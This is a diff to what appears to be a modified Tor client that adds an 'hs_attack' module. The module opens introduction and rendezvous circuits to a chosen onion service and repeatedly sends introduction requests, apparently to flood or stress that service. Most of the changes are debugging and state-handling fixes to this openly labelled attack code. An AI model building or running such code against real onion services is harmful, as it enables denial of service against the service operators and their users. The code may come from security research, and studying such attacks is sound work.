@@ -32,6 +32,10 @@ hs_attack_stats_t* hs_attack_entry_point(hs_attack_cmd_t cmd, const char *oniona
     attack_infos->stats->tot_cells = 0;
     attack_infos->stats->nbr_rendcircs = 0;
     attack_infos->extend_info = NULL;
+    //attack_infos->extend_info = (extend_info_t *) tor_malloc(sizeof(extend_info_t));
+    attack_infos->circ_to_intro = (circ_info_t *) tor_malloc(
+      sizeof(circ_info_t));
+    attack_infos->circ_to_intro->circ = NULL;
   }
   switch(cmd) {
     case ESTABLISH_RDV:
@@ -90,8 +94,6 @@ int hs_attack_init_intro_circuit(int retry) {
 
   if (retry == 0){
     log_debug(LD_REND, "HS_ATTACK: Entering hs_attack_init_intro_circuit\n");
-    attack_infos->circ_to_intro = (circ_info_t *) tor_malloc(
-      sizeof(struct circ_info_t));
     /* kind of hack. We don't any circuit yet
      * to use as introducing circuit. Launch one and wait
      * until we can canibilize it*/
@@ -107,27 +109,30 @@ int hs_attack_init_intro_circuit(int retry) {
     attack_infos->extend_info = rend_client_get_random_intro(attack_infos->rend_data);
   if (!attack_infos->extend_info) {
     log_info(LD_REND,
-        "No intro point for '%s': re-fetching service descriptor an try later.\n",
+        "HS_ATTACK: No intro point for '%s': re-fetching service descriptor an try later.\n",
          attack_infos->rend_data->onion_address);
     rend_client_refetch_v2_renddesc(attack_infos->rend_data);
     attack_infos->retry_intro++;
     control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
+    return 0;
   }
   /*Completly mindfuck yeah but ... Look for a general circuit; change its role
    * and send intro request
    * without having build previously a GENERAL circ, we got null =>
    *  Always build a general circ before then build the circ we need for introduction*/
+  log_debug(LD_REND, "HS_ATTACK: Yay! we have an intropoint : %s\n", extend_info_describe(
+        attack_infos->extend_info));
+ // return 0;
   attack_infos->circ_to_intro->circ = circuit_launch_by_extend_info(
       CIRCUIT_PURPOSE_C_INTRODUCING, attack_infos->extend_info, flags);
-  
-  return 0;
+  attack_infos->circ_to_intro->state = INTRO_CIRC_BUILDING;
   if (!attack_infos->circ_to_intro->circ && retry < RETRY_THRESHOLD) {
     //build a general circ and tell the client to retry in a few seconds
-    log_info(LD_REND, "HS_ATTACK: Did not find an intro circ, launched one\n");
+    log_info(LD_REND, "HS_ATTACK: Something went wrong when building\
+                       introcirc -- retry with new extend_info next time\n");
     //could do this with subtype of event like INFO : RETRY_INTRO
     //but it would be less nice on client side
     /*we have circuit; change its purpose*/
-    attack_infos->circ_to_intro->state = INTRO_CIRC_BUILDING;
     attack_infos->retry_intro++;
     control_event_hs_attack(HS_ATTACK_RETRY_INTRO);
     return 0;
@@ -147,11 +152,14 @@ int hs_attack_init_intro_circuit(int retry) {
  * if introcel circuit is ready
  */
 void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
+  //return;
   int retval=0;
+  log_debug(LD_REND, "HS_ATTACK: send_intro_cell_callback called !\n");
   if (!rendcirc) { //called when intro circ opened
     /*iter attack_infos->rendcircs for ready rendcircs*/
     SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, rendcirc_info) {
       if (rendcirc_info->state == REND_CIRC_READY_FOR_INTRO){
+        log_debug(LD_REND, "HS_ATTACK: Sending introduction request\n");
         retval = rend_client_send_introduction(attack_infos->circ_to_intro->circ,
             rendcirc_info->circ);
         if(retval < 0)
@@ -163,6 +171,7 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
   } else {
      /*send intro cell down introcirc with rendcirc circ
       */
+    //rendcirc->state = REND_CIRC_READY_FOR_INTRO;
     if (attack_infos->circ_to_intro->state == INTRO_CIRC_READY) {
       retval = rend_client_send_introduction(attack_infos->circ_to_intro->circ,
             rendcirc);
@@ -182,7 +191,7 @@ void hs_attack_send_intro_cell_callback(origin_circuit_t *rendcirc){
   err:
   //tell controler what happens depending on retvals => todo
   //control_event_hs_attack(HS_ATTACK_INTRO_NOT_SENT);
-  log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
+    log_debug(LD_BUG, "HS_ATTACK: INTRO not sent. retval: %d", retval);
 }
 
 /*
@@ -205,9 +214,21 @@ void hs_attack_mark_rendezvous_ready(origin_circuit_t *rendcirc) {
     control_event_hs_attack(HS_ATTACK_RD_READY);
 }
 
+void hs_attack_mark_rendezvous_ready_for_intro(origin_circuit_t *rendcirc) {
+  SMARTLIST_FOREACH_BEGIN(attack_infos->rendcircs, circ_info_t*, rendcirc_info) {
+    if (rendcirc_info->circ == rendcirc) {
+      log_debug(LD_REND, "HS_ATTACK: marking rendezvous circ ready for sending intro\n");
+      rendcirc_info->state = REND_CIRC_READY_FOR_INTRO;
+      return;
+    }
+  } SMARTLIST_FOREACH_END(rendcirc_info);
+  log_debug(LD_REND, "HS_ATTACK: rendcirc not in the list !\n");
+}
+
 void hs_attack_mark_intro_ready() {
-  log_debug(LD_REND, "HS_ATTACK: Marking Introcirc ready");
+  log_debug(LD_REND, "HS_ATTACK: Marking Introcirc ready\n");
   attack_infos->circ_to_intro->state = INTRO_CIRC_READY;
+  attack_infos->circ_to_intro->circ->rend_data = attack_infos->rend_data;
 }
 
 void hs_attack_launch(time_t *until) {
